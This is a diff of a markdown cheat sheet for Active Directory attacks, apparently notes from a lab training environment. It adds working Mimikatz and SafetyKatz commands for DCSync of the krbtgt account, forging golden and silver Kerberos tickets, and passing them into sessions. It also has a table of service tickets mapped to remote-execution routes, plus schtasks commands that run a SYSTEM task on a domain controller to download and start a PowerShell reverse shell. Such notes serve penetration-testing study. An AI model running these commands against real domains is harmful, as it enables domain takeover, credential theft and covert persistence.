@@ -753,7 +753,6 @@ SafetyKatz "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /aes256:XXX /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 # Or
 BetterSafetyKatz "kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /aes256:XXX  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
-
 # Instead of /ptt (which passes the ticket to the interactive session), /ticket can be used to save the ticket to a file (to be reused)
 
 ```
@@ -761,11 +760,21 @@ BetterSafetyKatz "kerberos::golden /User:Administrator /domain:corporate.corp.lo
 
 ### Silver Ticket
 
-- **Invoke-Mimikatz:**
 ```powershell
-# Silver ticket is about TGS. After kerberoasting a SPN and getting it's hash or password
-# 
-Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:0c88028bf3aa6a6a143ed846f2be1ea4 /user:Administrator /ptt"'
+# Silver ticket is about Service Acccounts (SPN) and TGS
+# It needs the Hash of the SPN (AES Key)
+# if a machine is compromised, it's possible to get its own account hash (in this case the persistence is valid for 30 days, he rotation period of computer account password)
+# Since the PAC is usually not verified it's possible to impersonate various service account having computer account hash
+# TGS owned    -> Service usable
+# HOST                         ->  scheduled task
+# HOST + RPPCSS                ->  Wmi
+# HOST + HTTP                  -> WinRM
+# HOST + HTTP +(WSMAN + RPCSS) -> WinRM
+# RPCSS + LDAP + CIFS          -> Windows RSAT
+
+Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+BetterSafetyKatz "kerberos::golden /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:XXXX /user:Administrator  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
 ```
 ```
 # Create a Scheduled task "STCheck" (download and execute a Powershell - Specifically a reverse shell)
@@ -774,6 +783,12 @@ schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /RU "NT Authority\SYSTEM
 ```
 # Execute Scheduled task (download and execute a Powershell - Specifically a reverse shell)
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
+```
+
+### Diamond Ticket
+
+```powershell
+# 
 ```
 
 ### Skeleton Key
